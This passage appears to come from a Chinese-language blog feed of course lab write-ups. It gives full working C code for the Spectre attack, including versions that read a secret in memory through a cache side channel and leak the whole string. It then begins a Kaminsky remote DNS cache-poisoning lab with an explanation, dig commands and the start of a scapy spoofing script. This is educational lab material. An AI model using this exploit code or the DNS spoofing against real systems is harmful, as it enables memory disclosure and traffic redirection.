class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> z;<br>  <span class="hljs-comment">// Train the CPU to take the true branch inside restrictedAccess().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <br>      restrictedAccess(i); <br>  &#125;<br>  <span class="hljs-comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span><br>  _mm_clflush(&amp;bound_upper);<br>  _mm_clflush(&amp;bound_lower);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++)  &#123;   &#125;<br>  <span class="hljs-comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span><br>  s = restrictedAccess(index_beyond);  <br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;  <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  flushSideChannel();<br>  <span class="hljs-type">size_t</span> index_beyond = (<span class="hljs-type">size_t</span>)(secret - (<span class="hljs-type">char</span>*)buffer);  <span class="hljs-comment">// ④</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret: %p \n&quot;</span>, secret);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buffer: %p \n&quot;</span>, buffer);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond);<br>  spectreAttack(index_beyond);<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Line➃从缓冲区开始就计算这个秘密的偏移量（我们假设攻击者知道这个秘密的地址；在真正的攻击中，攻击者有很多方法可以找出地址，包括猜测）。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o SpectreAttack SpectreAttack.c<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.17.jpg" class=""><h2 id="Task-5-Improve-the-Attack-Accuracy">Task 5: Improve the Attack Accuracy</h2><p><code>SpectreAttackImproved.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_lower = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_upper = <span class="hljs-number">9</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-type">uint8_t</span> temp    = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span>    *secret = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> scores[<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannelImproved</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-type">int</span> junk = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i * <span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)<br>      scores[i]++; <span class="hljs-comment">/* if cache hit, add 1 for this value */</span><br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spectreAttack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index_beyond)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> z;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br><br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>    restrictedAccess(i);  <br>  &#125;<br><br>  <span class="hljs-comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span><br>  _mm_clflush(&amp;bound_upper);<br>  _mm_clflush(&amp;bound_lower); <br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++)  &#123;  &#125;<br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Ask victim() to return the secret in out-of-order execution.</span><br>  s = restrictedAccess(index_beyond);<br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-type">size_t</span> index_beyond = (<span class="hljs-type">size_t</span>)(secret - (<span class="hljs-type">char</span>*)buffer);<br><br>  flushSideChannel();<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>; i++) scores[i]=<span class="hljs-number">0</span>; <br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*****\n&quot;</span>);  <span class="hljs-comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span><br>    spectreAttack(index_beyond);<br>    usleep(<span class="hljs-number">100</span>);<br>    reloadSideChannelImproved();<br>  &#125;<br><br>  <span class="hljs-type">int</span> max = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>(scores[max] &lt; scores[i]) max = i;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>1、编译运行SpectreAttackImproved.c，此时<code>usleep(10)</code>睡眠10s，攻击并不能一次成功。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o SpectreAttackImproved SpectreAttackImproved.c<br></code></pre></td></tr></table></figure><p>第一次运行不成功：</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.18.jpg" class=""><p>第二次运行成功：</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.19.jpg" class=""><p>2、修改<code>usleep(10)</code>为<code>usleep(100)</code>，增加睡眠时间，即增加预测时间，第一次运行程序便可以成功拿到Secret值。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.20.jpg" class=""><p>第一次运行就成功：</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.21.jpg" class=""><p>应该是由于usleep的时间不够，预测执行时间不够，array[s*4096 + DELTA] += 88;没能执行，容易导致最大score为scores[0]，只要增加时间为100微秒问题就可解决。</p><h2 id="Task-6-Steal-the-Entire-Secret-String">Task 6: Steal the Entire Secret String</h2><p>1、对SpectreAttackImproved.c进行修改，获取所有字符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> buffer_size = <span class="hljs-number">10</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-type">uint8_t</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> *secret = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; buffer_size) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> scores[<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannelImproved</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-type">int</span> junk = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i * <span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)<br>      scores[i]++; <span class="hljs-comment">/* if cache hit, add 1 for this value */</span><br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spectreAttack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> larger_x)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> z;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>    _mm_clflush(&amp;buffer_size);<br>    <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++) &#123; &#125;<br>    restrictedAccess(i);  <br>  &#125;<br>  <span class="hljs-comment">// Flush buffer_size and array[] from the cache.</span><br>  _mm_clflush(&amp;buffer_size);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-comment">// Ask victim() to return the secret in out-of-order execution.</span><br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++) &#123; &#125;<br>  s = restrictedAccess(larger_x);<br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x&lt;<span class="hljs-number">17</span>; x++)<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(scores, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(scores));<br>    <span class="hljs-type">size_t</span> larger_x = (<span class="hljs-type">size_t</span>)(secret-(<span class="hljs-type">char</span>*)buffer + x);<br>    flushSideChannel();<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>; i++) scores[i]=<span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>      spectreAttack(larger_x);<br>      reloadSideChannelImproved();<br>    &#125;<br>    <span class="hljs-type">int</span> max = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>     <span class="hljs-keyword">if</span>(scores[max] &lt; scores[i])  <br>       max = i;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading secret value at %p = &quot;</span>, (<span class="hljs-type">void</span>*)larger_x);<br>    usleep(<span class="hljs-number">50</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The  secret value is %d \t %c\n&quot;</span>, max,max);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>2、编译运行task6.c，刚开始时得到的字符较少，运行到第8次时得到只缺失第一个字符的字符串。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.22.jpg" class=""><p>3、修改睡眠时间为70，运行第5次得到只缺失第一个字符的字符串，第一个字符仍无法获取。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.23.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab11-DNS欺骗-Remote</title>
    <link href="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/"/>
    <url>/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/</url>
    
    <content type="html"><![CDATA[<p><strong>环境设置</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">c08bebc0db10  user-<span class="hljs-number">10.9.0.5</span><br><span class="hljs-number">96</span>c30fe7ee1b  seed-attacker<br><span class="hljs-number">9757</span>b8258d1f  local-dns-server-<span class="hljs-number">10.9.0.53</span><br>ee5b<span class="hljs-number">2d82b9a1</span>  attacker-ns-<span class="hljs-number">10.9.0.153</span><br>eee6e69ae762  mysql-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure><h1>远程DNS缓存中毒攻击说明</h1><p>本地DNS缓存中毒攻击有一定的局限性，必须在同一个局域网中。而远程攻击嗅探不到DNS请求。DNS请求中有两个数据远程攻击者很难获得：</p><p>1、UDP头部的源端口号：DNS请求通过UDP数据包发送，源端口号是16比特的随机数字</p><p>2、DNS头部16比特的交易ID</p><blockquote><p>:exclamation:一个欺骗回复必须包含这两个值，否则回复不会被接受。远程攻击者只能猜测这两个值，猜到 的概率为2的32次方，如果1秒内发1000个请求，则需要50天。如果用1000个主机的僵尸网络 发起攻击，则需要1.2小时</p></blockquote><p>而实际由于缓存的因素，DNS服务器不会对同一主机发起第二次请求，除非缓存内的结果过期。缓存的这个特点 使得攻击在尝试第二次攻击前需要等待，这使得远程DNS中毒攻击变得不现实。</p><p><strong>Kaminsky攻击</strong></p><p>为了对远程计算机发动欺骗攻击，需要完成三个任务：<br>1、触发目标服务器发送DNS请求<br>2、发送欺骗回复<br>3、使缓存失效</p><p>他的思路不是让缓存失效，而是去修改域名服务器的上一级权威域名服务器。用一个随机的二级域名向远程DNS服务器发请求， 在上一级权威域名服务器回复消息前，伪造消息给远程域名服务器，带上NS记录，如果猜错则继续用随机二级域名重试。(二级域名，SLD，顶级域名之下的域名)</p><p><strong>完整的DNS请求过程</strong></p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.01.jpg" class=""><p><strong>kaminsky攻击实现过程</strong>（example.com名称服务器被缓存情况下的DNS查询过程）</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.02.jpg" class=""><ol><li>攻击者查询DNS服务器Apollo查询example.com中不存在的名称，<a href="http://xn--twysw-4d3hh90d.example.com">例如twysw.example.com</a>，其中twysw是一个随机名称。</li><li>由于映射在Apollo的DNS缓存中不可用，Apollo向example.com域的名称服务器发送一个DNS查询</li><li>当Apollo等待回复时，攻击者用一连串欺骗的DNS响应淹没了Apollo，每个人都尝试了不同的事务ID，希望其中一个是正确的。在响应中，攻击者不仅为twysw.example.com提供了一个IP解析，攻击者还提供了一个“权威命名服务器”记录，指示ns.attacker32.com为example.com域的命名服务器。如果欺骗响应超过实际响应，并且事务ID与查询中的匹配，Apollo将接受并缓存欺骗答案，因此Apollo的DNS缓存将被中毒。</li><li>即使欺骗的DNS响应失败（例如事务ID不匹配或太晚），也不重要，因为下次攻击者将查询不同的名称，所以Apollo必须发送另一个查询，给攻击另一个进行欺骗攻击的机会。这有效地破坏了缓存效果。</li><li>如果攻击成功，在Apollo的DNS缓存中，example.com的命名服务器将被攻击者的命名服务器ns.attacker32.com所取代。</li></ol><h1>Lab Environment Setup (Task 1)</h1><p>1、当执行命令<code>dig www.example.com</code>时，victim会把请求发送给本地域名服务器，本地域名服务器会发送请求给example.com的官方nameserver，最终的到对应的IP。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.2.png" class=""><p>2、当执行命令<code>dig @ns.attacker32.com www.example.com</code>时，<a href="http://xn--ns-0j3cw2p30xq0fopi45w0hqjx4avgau37b.attacker32.com">查询请求会直接发送给ns.attacker32.com</a>，得到的IP为攻击者控制的IP。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.3.png" class=""><h1>Task 2: Construct DNS request</h1><p>task2实现的是伪造DNS查询向本地域名服务器发送请求（一个未缓存的域名解析记录），使本地域名服务器也发送DNS请求。</p><p>1、修改gen_dns_request.py，随机指定一个src IP，目标IP为本地域名服务器的IP10.9.0.53，查询的域名为一个随机且不存在的域名。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># The source IP can be any address. </span><br><span class="hljs-comment"># However, if the target local DNS server is configured to only respond</span><br><span class="hljs-comment"># to requests from local machines, this source IP should be in the 